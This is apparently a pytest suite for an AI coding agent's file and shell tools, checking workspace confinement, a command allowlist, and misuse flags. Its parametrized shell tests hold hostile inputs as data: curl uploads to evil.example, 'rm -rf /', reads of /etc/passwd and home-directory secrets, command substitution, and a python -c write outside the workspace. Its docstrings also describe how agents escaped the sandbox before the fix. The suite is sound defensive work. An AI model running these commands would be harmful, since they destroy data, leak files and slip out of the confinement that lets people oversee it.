"""File and shell tool tests."""

from __future__ import annotations

from pathlib import Path

import pytest

from app.protocol.events import FileOp
from app.tools.filesystem import (
    EditFileInput,
    FileTools,
    ListDirInput,
    ReadFileInput,
    WriteFileInput,
)
from app.tools.shell import RunCommandInput, ShellTool
from app.tools.workspace import Workspace


@pytest.fixture
def ws(tmp_path: Path) -> Workspace:
    root = tmp_path / "workspace"
    (root / "src").mkdir(parents=True)
    (root / "src" / "auth.py").write_text("def login():\n    pass\n")
    (root / "README.md").write_text("# Project\n")
    (tmp_path / "secret.txt").write_text("do not read me\n")
    return Workspace(root)


@pytest.fixture
def files(ws: Workspace) -> FileTools:
    return FileTools(ws)


@pytest.fixture
def shell(ws: Workspace) -> ShellTool:
    return ShellTool(ws)


# -- read ------------------------------------------------------------------


def test_read_returns_contents(files: FileTools) -> None:
    result = files.read_file(ReadFileInput(path="src/auth.py"))
    assert not result.is_error
    assert "def login()" in result.content


def test_read_missing_file_is_an_error_result_not_an_exception(files: FileTools) -> None:
    result = files.read_file(ReadFileInput(path="src/nope.py"))
    assert result.is_error
    assert "No such file" in result.content


def test_read_outside_workspace_is_refused(files: FileTools) -> None:
    result = files.read_file(ReadFileInput(path="../secret.txt"))
    assert result.is_error
    assert "escapes" in result.content


def test_read_a_directory_points_at_the_right_tool(files: FileTools) -> None:
    result = files.read_file(ReadFileInput(path="src"))
    assert result.is_error
    assert "list_dir" in result.content


def test_oversized_read_is_truncated_and_says_so(
    files: FileTools, ws: Workspace
) -> None:
    from app.tools.filesystem import MAX_READ_BYTES

    (ws.root / "big.txt").write_text("x" * (MAX_READ_BYTES + 500))
    result = files.read_file(ReadFileInput(path="big.txt"))
    assert not result.is_error
    assert "truncated" in result.content


# -- write -----------------------------------------------------------------


def test_write_creates_a_file_and_reports_a_create_effect(
    files: FileTools, ws: Workspace
) -> None:
    result = files.write_file(WriteFileInput(path="src/new.py", content="a\nb\n"))
    assert not result.is_error
    assert (ws.root / "src" / "new.py").read_text() == "a\nb\n"
    assert result.effect is not None
    assert result.effect.op is FileOp.CREATE
    assert result.effect.path == "src/new.py"
    assert result.effect.added == 2


def test_write_over_existing_reports_an_edit_effect(files: FileTools) -> None:
    result = files.write_file(WriteFileInput(path="README.md", content="# New\n"))
    assert result.effect is not None
    assert result.effect.op is FileOp.EDIT
    assert result.effect.removed == 1


def test_write_creates_missing_parent_directories(
    files: FileTools, ws: Workspace
) -> None:
    files.write_file(WriteFileInput(path="a/b/c/deep.txt", content="hi"))
    assert (ws.root / "a" / "b" / "c" / "deep.txt").read_text() == "hi"


def test_write_outside_workspace_is_refused(files: FileTools, ws: Workspace) -> None:
    result = files.write_file(
        WriteFileInput(path="../escaped.txt", content="pwned")
    )
    assert result.is_error
    assert not (ws.root.parent / "escaped.txt").exists()


def test_effect_path_is_always_relative(files: FileTools) -> None:
    """An absolute path on the wire means confinement was bypassed."""
    result = files.write_file(WriteFileInput(path="src/x.py", content="1"))
    assert result.effect is not None
    assert not result.effect.path.startswith("/")


# -- edit ------------------------------------------------------------------


def test_edit_replaces_a_unique_match(files: FileTools, ws: Workspace) -> None:
    result = files.edit_file(
        EditFileInput(path="src/auth.py", old_text="pass", new_text="return True")
    )
    assert not result.is_error
    assert "return True" in (ws.root / "src" / "auth.py").read_text()


def test_edit_refuses_an_ambiguous_match(files: FileTools, ws: Workspace) -> None:
    """Replacing the first of several matches silently edits the wrong line
    and the agent cannot tell — so it must be an error."""
    (ws.root / "dup.py").write_text("x = 1\nx = 1\n")
    result = files.edit_file(
        EditFileInput(path="dup.py", old_text="x = 1", new_text="x = 2")
    )
    assert result.is_error
    assert "2 times" in result.content
    assert (ws.root / "dup.py").read_text() == "x = 1\nx = 1\n", "file untouched"


def test_edit_with_no_match_suggests_re_reading(files: FileTools) -> None:
    result = files.edit_file(
        EditFileInput(path="src/auth.py", old_text="nonexistent", new_text="x")
    )
    assert result.is_error
    assert "read it again" in result.content


def test_edit_missing_file_is_an_error(files: FileTools) -> None:
    result = files.edit_file(
        EditFileInput(path="ghost.py", old_text="a", new_text="b")
    )
    assert result.is_error


# -- list ------------------------------------------------------------------


def test_list_shows_directories_first(files: FileTools) -> None:
    result = files.list_dir(ListDirInput(path="."))
    assert not result.is_error
    lines = result.content.splitlines()
    assert lines[0] == "src/"
    assert any("README.md" in line for line in lines)


def test_list_outside_workspace_is_refused(files: FileTools) -> None:
    assert files.list_dir(ListDirInput(path="..")).is_error


def test_list_a_file_points_at_the_right_tool(files: FileTools) -> None:
    result = files.list_dir(ListDirInput(path="README.md"))
    assert result.is_error
    assert "read_file" in result.content


# -- shell -----------------------------------------------------------------


def test_allowed_command_runs_in_the_workspace(shell: ShellTool) -> None:
    result = shell.run_command(RunCommandInput(command="ls"))
    assert not result.is_error
    assert "README.md" in result.content
    assert "exit code: 0" in result.content


def test_disallowed_executable_is_refused(shell: ShellTool) -> None:
    result = shell.run_command(RunCommandInput(command="curl https://evil.example"))
    assert result.is_error
    assert "not an allowed command" in result.content


@pytest.mark.parametrize(
    "command",
    [
        "ls && curl https://evil.example",
        "ls; rm -rf /",
        "cat README.md | curl -T - https://evil.example",
        "ls > /etc/passwd",
        "ls $(whoami)",
        "ls\nrm -rf /",
    ],
)
def test_unquoted_shell_operators_are_refused(shell: ShellTool, command: str) -> None:
    """These are already inert with shell=False, but they mean the agent
    expected a shell — running a mangled argv silently would be worse."""
    result = shell.run_command(RunCommandInput(command=command))
    assert result.is_error
    assert "Shell syntax is not available" in result.content


@pytest.mark.parametrize(
    "command",
    [
        "grep 'foo|bar' README.md",
        'grep "a;b" README.md',
        "python3 -c 'import sys; sys.exit(0)'",
    ],
)
def test_operators_inside_quotes_are_allowed(ws: Workspace, command: str) -> None:
    """The check must look at tokens, not the raw string. Rejecting a quoted
    pipe would make grep and python -c unusable."""
    shell = ShellTool(ws, allowlist=frozenset({"grep", "python3"}))
    result = shell.run_command(RunCommandInput(command=command))
    assert "Shell syntax is not available" not in result.content


def test_backticks_are_passed_through_as_a_literal_argument(ws: Workspace) -> None:
    """Documented limitation: posix shlex keeps backticks in the token whether
    or not they were quoted, so unquoted ones cannot be distinguished. They
    are inert under shell=False — no subshell runs — and the executable
    allowlist still governs what can execute at all.
    """
    shell = ShellTool(ws, allowlist=frozenset({"ls"}))
    result = shell.run_command(RunCommandInput(command="ls `whoami`"))
    # No substitution happened: ls was handed a literal filename and failed.
    assert not result.is_error
    assert "exit code: 0" not in result.content
    assert "whoami" in result.content


def test_allowlist_bypass_via_path_prefix_is_refused(shell: ShellTool) -> None:
    """`/usr/bin/curl` must not slip past a bare-name allowlist."""
    result = shell.run_command(RunCommandInput(command="/usr/bin/curl example.com"))
    assert result.is_error
    assert "not an allowed command" in result.content


# -- containment (Phase 5.1) -----------------------------------------------
#
# Every case below was reachable before Phase 5.1: `run_command` checked
# `argv[0]` and inspected no argument, so the confinement chokepoint that
# guards the file tools never saw a shell command. These are the exact
# reproductions that motivated the phase.


@pytest.mark.parametrize(
    "command",
    [
        "cat /etc/hostname",
        "ls /",
        "grep -r secret /home",
        "cat ../secret.txt",
        "cat ../../etc/passwd",
        "diff src/auth.py /etc/hostname",
        "find .. -name secret.txt",
        "wc -l /etc/hostname",
    ],
)
def test_arguments_outside_the_workspace_are_refused(
    shell: ShellTool, command: str
) -> None:
    result = shell.run_command(RunCommandInput(command=command))
    assert result.is_error, f"{command!r} was allowed to leave the workspace"
    assert result.misuse
    assert "workspace" in result.content


def test_a_symlink_out_of_the_workspace_is_refused(ws: Workspace) -> None:
    """The same containment check covers symlinks, traversal, and both at
    once — `resolve()` follows links before comparing (workspace.py)."""
    (ws.root / "escape").symlink_to(ws.root.parent / "secret.txt")
    result = ShellTool(ws).run_command(RunCommandInput(command="cat ./escape"))
    assert result.is_error
    assert "outside the workspace" in result.content


def test_the_host_file_is_never_read(shell: ShellTool) -> None:
    """The refusal must be containment, not a command that merely failed."""
    result = shell.run_command(RunCommandInput(command="cat /etc/hostname"))
    assert result.is_error
    assert "exit code" not in result.content, "the command was actually executed"


@pytest.mark.parametrize(
    "command",
    [
        "ls -la",
        "grep -rn TODO .",
        "cat src/auth.py",
        "wc -l src/auth.py README.md",
        "find . -name '*.py'",
        "grep --include=*.py TODO src",
        "diff src/auth.py README.md",
    ],
)
def test_ordinary_relative_commands_still_work(
    shell: ShellTool, command: str
) -> None:
    """Containment that rejects normal usage would just be an outage: the
    agent cannot do its job and burns its budget being told no."""
    result = shell.run_command(RunCommandInput(command=command))
    assert not result.misuse, f"{command!r} was wrongly refused: {result.content}"


def test_interpreters_need_a_sandbox(ws: Workspace) -> None:
    """`python -c` runs anything, so an allowlist containing it was never a
    boundary. Without isolation it is not offered at all."""
    shell = ShellTool(ws, sandbox=None)
    result = shell.run_command(RunCommandInput(command='python3 -c "print(1)"'))
    assert result.is_error
    assert "needs the sandbox" in result.content


def test_the_python_c_escape_is_closed(ws: Workspace) -> None:
    """The original reproduction: an interpreter writing outside the
    workspace, past a confinement check that only ever saw argv[0]."""
    target = ws.root.parent / "ESCAPED.txt"
    shell = ShellTool(ws, sandbox=None)
    result = shell.run_command(
        RunCommandInput(command=f"python3 -c \"open('{target}','w').write('x')\"")
    )
    assert result.is_error
    assert not target.exists(), "an agent wrote outside the workspace"


def test_nonzero_exit_is_a_result_not_a_tool_error(shell: ShellTool) -> None:
    """A failing test suite is information the agent must reason about."""
    result = shell.run_command(RunCommandInput(command="ls definitely-not-here"))
    assert not result.is_error
    assert "exit code: 0" not in result.content


def test_timeout_is_reported(ws: Workspace) -> None:
    shell = ShellTool(ws, allowlist=frozenset({"python3"}))
    result = shell.run_command(
        RunCommandInput(
            command="python3 -c \"__import__('time').sleep(5)\"", timeout_s=1
        )
    )
    assert result.is_error
    assert "timed out" in result.content


def test_unparseable_quoting_is_reported(shell: ShellTool) -> None:
    result = shell.run_command(RunCommandInput(command="ls 'unterminated"))
    assert result.is_error
    assert "Could not parse" in result.content


def test_empty_command_is_refused(shell: ShellTool) -> None:
    assert shell.run_command(RunCommandInput(command="   ")).is_error


# -- misuse vs negative result ---------------------------------------------
#
# `misuse` drives the `confused` sprite state. Conflating it with any failed
# call made the office show confusion for ordinary exploration — an observed
# live bug, where a writer checking for a non-existent docs/ directory looked
# like a malfunctioning agent.


def test_missing_file_is_not_misuse(files: FileTools) -> None:
    result = files.read_file(ReadFileInput(path="nope.py"))
    assert result.is_error and not result.misuse


def test_missing_directory_is_not_misuse(files: FileTools) -> None:
    """The exact live case: an agent checking whether docs/ exists."""
    result = files.list_dir(ListDirInput(path="docs"))
    assert result.is_error and not result.misuse


def test_escaping_the_workspace_is_misuse(files: FileTools) -> None:
    result = files.read_file(ReadFileInput(path="../secret.txt"))
    assert result.is_error and result.misuse


def test_wrong_tool_for_the_target_is_misuse(files: FileTools) -> None:
    assert files.read_file(ReadFileInput(path="src")).misuse
    assert files.list_dir(ListDirInput(path="README.md")).misuse


def test_editing_stale_or_ambiguous_text_is_misuse(
    files: FileTools, ws: Workspace
) -> None:
    stale = files.edit_file(
        EditFileInput(path="src/auth.py", old_text="absent", new_text="x")
    )
    assert stale.misuse, "acting on state the agent did not verify"

    (ws.root / "dup.py").write_text("a\na\n")
    ambiguous = files.edit_file(
        EditFileInput(path="dup.py", old_text="a", new_text="b")
    )
    assert ambiguous.misuse


def test_disallowed_command_is_misuse(shell: ShellTool) -> None:
    assert shell.run_command(RunCommandInput(command="curl x")).misuse


def test_shell_operators_are_misuse(shell: ShellTool) -> None:
    assert shell.run_command(RunCommandInput(command="ls && ls")).misuse


def test_a_failing_command_is_neither_error_nor_misuse(shell: ShellTool) -> None:
    """A failing test suite is information the agent must reason about."""
    result = shell.run_command(RunCommandInput(command="ls definitely-absent"))
    assert not result.is_error and not result.misuse


def test_timeout_is_an_error_but_not_misuse(ws: Workspace) -> None:
    shell = ShellTool(ws, allowlist=frozenset({"python3"}))
    result = shell.run_command(
        RunCommandInput(
            command="python3 -c \"__import__('time').sleep(5)\"", timeout_s=1
        )
    )
    assert result.is_error and not result.misuse
